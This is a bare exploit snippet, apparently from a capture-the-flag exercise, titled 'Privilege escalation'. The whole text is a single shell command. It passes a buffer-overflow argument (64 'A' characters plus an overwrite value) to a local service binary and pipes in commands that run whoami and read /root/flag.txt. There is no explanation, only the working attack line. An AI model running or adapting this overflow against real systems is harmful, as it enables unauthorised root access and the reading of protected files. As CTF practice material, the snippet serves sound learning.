Privilege escalation
(cat <<EOF
whoami
cat /root/flag.txt
EOF
) | /home/user/service $(python3 -c "print('A'*64 + '22222222')")

